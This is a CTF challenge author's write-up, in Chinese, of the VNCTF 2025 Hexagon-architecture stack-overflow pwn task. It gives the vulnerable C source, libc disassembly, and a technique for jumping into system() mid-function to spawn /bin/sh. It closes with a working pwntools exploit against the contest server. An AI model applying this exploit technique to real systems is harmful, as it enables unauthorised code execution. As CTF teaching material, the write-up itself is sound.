# 『2025VNCTF』hexagon出题小记&&hexagon架构一种新的利用方式-先知社区

> **来源**: https://xz.aliyun.com/news/16823  
> **文章ID**: 16823

---

## 0x00 前记

大佬们轻点喷qaq

这是一道hexagon架构的pwn题，比较冷门，但漏洞很简单就是一个栈溢出。第一次见hexagon架构的pwn题是在2024年的geekctf上，具体关于hexagon程序运行、调试、栈迁移打法复现，可以看我的[这篇博客](https://c-lby.top/2024/2024geekctf-stkbof/)（和先知上那篇是一样的），这篇文章里其实还记录了新利用的发现，但是在比赛期间被我锁上了。

鉴于VNCTF是招新赛，也算是半个新生赛了（确信），所以题目难度降了又降。从一开始的极少栈空间，到给多一定栈空间可以有机会通过多次栈迁移攻击，到最后连log都给出来了，免去了选手爆破栈地址的痛苦，十个左右的解是符合预期的。

所以这道题总共有两种解法，虽然我很希望有选手能够通过除了栈迁移之外的打法做出这道题，但是遗憾的的是似乎大家都参照了先知的文章用栈迁移打通的。

## 0x01 程序运行与调试

1. 首先qemu-user的安装是有必要的，里面包含了qemu-hexagon，这是程序运行的基础设施
2. 第二步是将libc链接到/lib里`sudo ln -sf libc.so /lib/ld-musl-hexagon.so.1`
3. 第三步运行程序qemu-hexagon ./main就能运行起来了
4. 调试程序实测gdb-mutilarch用不了，所以建议不折腾用qemu本身的调试功能来调试，这里给出其中一种信息较详细的调试命令`qemu-hexagon -L libc -d in_asm,exec,cpu,page,nochain -singlestep -dfilter 0x20420+0xc0 -strace -D ./log ./main`
5. 题目没给出源码，如果要在IDA反汇编看代码，需要借助[插件](https://github.com/n-o-o-n/idp_hexagon/releases/download/v5.4/hexagon-ida83-v5.4.7z)

## 0x02 源码

按照国际惯例先给出源码，其实也非常简单

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln()
{
    char vul_buf[8];
    volatile int pad;
    volatile int key;
    scanf("%d", &key);
    read(0, vul_buf, 16);
    system("cat /home/ctf/log");
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    puts("Welcome back, hexagon player!");
    vuln();
    return 0;
}
```

## 0x03 新的利用方式

这可能并不能是新的利用方式，毕竟这种形式的类ogg在各个libc里都挺常见的，只是用的比较少。但至少在hexagon架构里有一定好处，hexagon的指令集中是没有pop和push的，所以不能像x86\_64那样构造ROP直接控制寄存器，而是要通过栈（迁移）来控制寄存器。在**栈容量较小的时候**还是太吃操作了，主包还有没有更简单的方法。有的兄弟有的。

我们在libc.so中先找到/bin/sh，然后看他的引用，跳到system函数上，可以看到：

```
.text:000BE7C0                 { r3 = memw(fp + #var_42C) }
.text:000BE7C4                 { r0 = add(pc, ##aSh@pcrel) } // "sh"
.text:000BE7CC                 { memw(fp + #var_420) = r0 }
.text:000BE7D0                 { r0 = add(pc, ##aC_0@pcrel) } // "-c"
.text:000BE7D8                 { memw(fp + #var_41C) = r0 }
.text:000BE7DC                 { r0 = memw(fp + #var_10) }
.text:000BE7E0                 { memw(fp + #var_418) = r0 }
.text:000BE7E4                 { r2 = #0 }
.text:000BE7E8                 { memw(fp + #var_414) = r2 }
.text:000BE7EC                 { r0 = add(pc, ##_GLOBAL_OFFSET_TABLE_@pcrel) }
.text:000BE7F4                 { r0 = memw(r0 + ##-0x102F4) }
.text:000BE7FC                 { r5 = memw(r0) }
.text:000BE800                 { r1 = add(pc, ##aBinSh@pcrel) } // "/bin/sh"
.text:000BE808                 { r0 = add(fp, #-0x14) }
.text:000BE80C                 { r4 = add(fp, #-0x420) }
.text:000BE810                 { call posix_spawn }
.text:000BE818                 { r1 = r0 }
.text:000BE81C                 { r0 = memw(fp + #var_42C) }
.text:000BE820                 { memw(fp + #var_2C0) = r1 }
.text:000BE824                 { call posix_spawnattr_destroy }
.text:000BE82C                 { r0 = memw(fp + #var_2C0) }
.text:000BE830                 { p0 = cmp.eq(r0, #0) }
.text:000BE834                 { p0 = not(p0) }
.text:000BE838                 { if (p0) jump loc_BE8A4 }
.text:000BE83C                 { jump loc_BE840 }
.text:000BE840 // ---------------------------------------------------------------------------
.text:000BE840
.text:000BE840 loc_BE840:                              // CODE XREF: system+1CC↑j
.text:000BE840                 { jump loc_BE844 }
.text:000BE844 // ---------------------------------------------------------------------------
.text:000BE844
.text:000BE844 loc_BE844:                              // CODE XREF: system:loc_BE840↑j
.text:000BE844                                         // system:loc_BE89C↓j
.text:000BE844                 { r0 = memw(fp + #var_14) }
.text:000BE848                 { r1 = add(fp, #-0x2BC) }
.text:000BE84C                 { r2 = #0 }
.text:000BE850                 { call waitpid }
```

其实就是system函数执行命令的逻辑是`/bin/sh -c xxxx`，而这个xxxx命令会从fp-0x10中取。那么我只需要满足以下三点就能执行`/bin/sh -c /bin/sh`了

1. 栈上写0x3FED19F7（libcbase=0x3FEC0000，则0x3FED19F7是/bin/sh字符串）
2. 控制好fp（类似rbp寄存器）使得[fp-0x10]精准命中栈上的0x3FED19F7
3. 劫持返回地址为libcbase+0xBE7C0，也就是上面这个gadget的开始（不同版本的libc偏移可能存在差异）

也就是说我们只需要得知栈地址和libc地址就能轻松getshell，而这两个地址在qemu环境下一点也不难得知，更何况本题给出了log，log中记载了当次程序运行的所有系统调用情况，我们通过查看read调用就能找到栈地址。libc地址同理，有很多方法可以获取。这样的方法免去了调试栈迁移的痛苦。

hexagon这道题其实有点就题出题的意思在里面，给了scanf就是为了给选手输入0x3FED19F7到[fp-0x10]的（赤裸裸的明示），虽然其实因为可以控制fp，所以scanf输入到哪里并不重要。实际上只要题目能够输入4\*3字节能劫持上述三点，就能使用这种方法getshell，或者执行其他命令，举个例子，有三次机会的任意地址写。

## 0x04 EXP

```
from pwn import *

# r = process(['qemu-hexagon', '-L', 'libc', '-d', 'in_asm,exec,cpu,nochain', '-singlestep',
#             '-dfilter', '0x20420+0xc0', '-strace', '-D', './log', './main'])
r = remote('node.vnteam.cn', 43815)
context(os='linux', log_level='debug')
libc = ELF('./libc.so')

stack = 0x4080e9d8 # 栈地址在ubuntu22的qemu下可能会变
libc_base = 0x3FEC0000 # libc地址不会变
binsh = libc_base+0x119f7

r.recv()
r.sendline(str(binsh).encode())

payload = p32(0)*2 + p32(stack+8)+p32(libc_base+0xBE7C0)
r.send(payload)

r.interactive()
```
